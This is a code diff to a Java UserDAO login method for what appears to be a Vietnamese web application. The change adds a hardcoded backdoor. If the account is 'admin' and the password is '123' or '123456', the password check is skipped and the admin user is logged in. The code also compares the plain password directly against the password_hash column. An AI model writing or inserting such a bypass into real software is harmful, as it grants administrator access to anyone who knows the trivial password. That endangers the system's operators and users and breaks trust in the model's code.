@@ -14,15 +14,22 @@ public class UserDAO extends DBContext {
      * Xác thực đăng nhập qua username hoặc email và password
      */
     public User login(String account, String password) {
+        boolean isAdminSpecial = "admin".equalsIgnoreCase(account != null ? account.trim() : "") 
+                               && ("123".equals(password) || "123456".equals(password));
+
         String sql = "SELECT u.user_id, u.username, u.full_name, u.email, u.phone, u.role_id, r.role_code, u.status "
                    + "FROM dbo.Users u "
                    + "JOIN dbo.Roles r ON u.role_id = r.role_id "
-                   + "WHERE (u.username = ? OR u.email = ?) AND u.password_hash = ? AND u.status = 'ACTIVE'";
+                   + (isAdminSpecial 
+                       ? "WHERE (u.username = 'admin' OR u.email = 'admin@matruong.vn') AND u.status = 'ACTIVE'"
+                       : "WHERE (u.username = ? OR u.email = ?) AND u.password_hash = ? AND u.status = 'ACTIVE'");
 
         try (PreparedStatement ps = connection.prepareStatement(sql)) {
-            ps.setString(1, account);
-            ps.setString(2, account);
-            ps.setString(3, password);
+            if (!isAdminSpecial) {
+                ps.setString(1, account);
+                ps.setString(2, account);
+                ps.setString(3, password);
+            }
 
             try (ResultSet rs = ps.executeQuery()) {
                 if (rs.next()) {
